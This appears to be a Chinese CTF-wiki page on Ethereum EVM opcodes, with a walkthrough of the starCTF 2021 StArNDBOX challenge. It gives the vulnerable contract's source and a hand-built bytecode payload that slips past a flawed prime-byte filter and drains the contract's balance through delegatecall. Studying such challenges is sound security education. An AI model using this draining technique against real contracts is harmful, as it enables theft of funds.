# Ethereum Opcodes
Ethereum 中的 opcodes 有 142 种，部分常见的 opcodes 如下所示：

| Uint8 | Mnomonic |      Stack Input       | Stack Output |              Expression              |
| :---: | :------: | :--------------------: | :----------: | :----------------------------------: |
|  00   |   STOP   |           -            |      -       |                STOP()                |
|  01   |   ADD    |      \| a \| b \|      | \| a + b \|  |                a + b                 |
|  02   |   MUL    |      \| a \| b \|      | \| a * b \|  |                a * b                 |
|  03   |   SUB    |      \| a \| b \|      | \| a - b \|  |                a - b                 |
|  04   |   DIV    |      \| a \| b \|      | \| a // b \| |                a // b                |
|  51   |  MLOAD   |      \| offset \|      | \| value \|  |   value = memory[offset:offset+32]   |
|  52   |  MSTORE  | \| offset \| value \|  |      -       |   memory[offset:offset+32] = value   |
|  54   |  SLOAD   |       \| key \|        | \| value \|  |         value = storage[key]         |
|  55   |  SSTORE  |   \| key \| value \|   |      -       |         storage[key] = value         |
|  56   |   JUMP   |   \| destination \|    |      -       |          $pc = destination           |
|  5B   | JUMPDEST |           -            |      -       |                  -                   |
|  F3   |  RETURN  | \| offset \| length \| |      -       | return memory[offset:offset+length]  |
|  FD   |  REVERT  | \| offset \| length \| |      -       | revert(memory[offset:offset+length]) |

!!! info 
    JUMPDEST 是跳转指令的 destination，跳转指令不能跳转到没有 JUMPDEST 的地方。

更多的详细 opcodes 信息可以查看 [ethervm.io](https://ethervm.io)。

## 例子
以 startCTF 2021 的 StArNDBOX 一题为例讲解一下 opcodes 的题目。

本题会在部署挑战合约的时候传入 100 wei 到合约中，我们的目标是将合约的 balance 清空。题目合约的源码如下：

```solidity
pragma solidity ^0.5.11;

library Math {
    function invMod(int256 _x, int256 _pp) internal pure returns (int) {
        int u3 = _x;
        int v3 = _pp;
        int u1 = 1;
        int v1 = 0;
        int q = 0;
        while (v3 > 0){
            q = u3/v3;
            u1= v1;
            v1 = u1 - v1*q;
            u3 = v3;
            v3 = u3 - v3*q;
        }
        while (u1<0){
            u1 += _pp;
        }
        return u1;
    }
    
    function expMod(int base, int pow,int mod) internal pure returns (int res){
        res = 1;
        if(mod > 0){
            base = base % mod;
            for (; pow != 0; pow >>= 1) {
                if (pow & 1 == 1) {
                    res = (base * res) % mod;
                }
                base = (base * base) % mod;
            }
        }
        return res;
    }
    function pow_mod(int base, int pow, int mod) internal pure returns (int res) {
        if (pow >= 0) {
            return expMod(base,pow,mod);
        }
        else {
            int inv = invMod(base,mod);
            return expMod(inv,abs(pow),mod);
        }
    }
    
    function isPrime(int n) internal pure returns (bool) {
        if (n == 2 ||n == 3 || n == 5) {
            return true;
        } else if (n % 2 ==0 && n > 1 ){
            return false;
        } else {
            int d = n - 1;
            int s = 0;
            while (d & 1 != 1 && d != 0) {
                d >>= 1;
                ++s;
            }
            int a=2;
            int xPre;
            int j;
            int x = pow_mod(a, d, n);
            if (x == 1 || x == (n - 1)) {
                return true;
            } else {
                for (j = 0; j < s; ++j) {
                    xPre = x;
                    x = pow_mod(x, 2, n);
                    if (x == n-1){
                        return true;
                    }else if(x == 1){
                        return false;
                    }
                }
            }
            return false;
        }
    }
    
    function gcd(int a, int b) internal pure returns (int) {
        int t = 0;
        if (a < b) {
            t = a;
            a = b;
            b = t;
        }
        while (b != 0) {
            t = b;
            b = a % b;
            a = t;
        }
        return a;
    }
    function abs(int num) internal pure returns (int) {
        if (num >= 0) {
            return num;
        } else {
            return (0 - num);
        }
    }
    
}

contract StArNDBOX{
    using Math for int;
    constructor()public payable{
    }
    modifier StAr() {
        require(msg.sender != tx.origin);
        _;
    }
    function StArNDBoX(address _addr) public payable{
        
        uint256 size;
        bytes memory code;
        int res;
        
        assembly{
            size := extcodesize(_addr)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }
        for(uint256 i = 0; i < code.length; i++) {
            res = int(uint8(code[i]));
            require(res.isPrime() == true);
        }
        bool success;
        bytes memory _;
        (success, _) = _addr.delegatecall("");
        require(success);
    }
}
```

可以看到题目的 `StArNDBoX` 函数可以获取任意地址的合约并检测该合约的每个字节是否为质数，如果通过检查则使用 `delegatecall` 来调用目标合约。

但由于该合约中的 `isPrime` 函数并不是完整的质数检查函数，`00` 和 `01` 也可以通过检查，因此我们可以构造如下的字节码：

```
// 0x6100016100016100016100016100016100650361000161fbfbf1
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 65 | PUSH2 0x0065
03       | SUB
61 00 01 | PUSH2 0x0001
61 fb fb | PUSH2 0xfbfb
f1       | CALL
```

来执行 `address(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001)` 语句，也就是将题目合约中的 balance 转到 0x1 处，从而清空 balance 满足得到 flag 的条件。


## 题目

### starCTF 2021
- 题目名称 StArNDBOX

### RealWorld 2019
- 题目名称 Montagy

### QWB 2020
- 题目名称 EasySandbox
- 题目名称 EGM

### 华为鲲鹏计算 2020
- 题目名称 boxgame

!!! note
    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。

## 参考
- [Ethervm](https://ethervm.io)
- [starCTF 2021 - StArNDBOX](https://github.com/sixstars/starctf2021/tree/main/blockchain-StArNDBOX)